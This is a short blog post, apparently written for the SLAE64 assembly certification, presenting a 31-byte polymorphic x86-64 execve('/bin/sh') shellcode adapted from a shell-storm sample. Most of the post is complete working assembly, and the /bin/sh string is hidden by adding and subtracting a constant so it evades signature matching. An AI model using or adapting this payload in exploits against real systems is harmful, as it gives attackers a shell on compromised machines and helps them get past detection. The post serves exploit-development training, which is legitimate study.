# Polymorphic version of a 33 byte execve shellcode

Original version:
```
http://shell-storm.org/shellcode/files/shellcode-76.php
```

This post describes a polymorphic version of a 33 byte execve shellcode.
My polymorphic version is 31 bytes in size and thus 2 bytes shorter then its original version.

## Changes

1. I used ```cdq``` in order to zero out rdx.
2. The original version uses ```shr``` to obfuscate the /bin/sh string. I changed this obfuscation by moving hex(/bin/sh) - 0x13377331 in rbx and then adding 0x13377331 again to deobfuscate at runtime.

## Asm
```
; Polymorphic shellcode version of http://shell-storm.org/shellcode/files/shellcode-76.php
; Original size: 33 bytes
; Polymorphic size: 31 bytes


global _start
section .text
_start:

    xor rax, rax ; clear out rax
    cdq          ; clear out rdx
    push rax
    pop rsi

    mov rbx, 0x68732f2f5b31eefe ; Some string obfuscation
    add rbx, 0x13377331

    push rax
    push rbx

    push rsp
    pop rdi ; rdi points to /bin/sh

    mov al, 0x3b
    syscall


```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
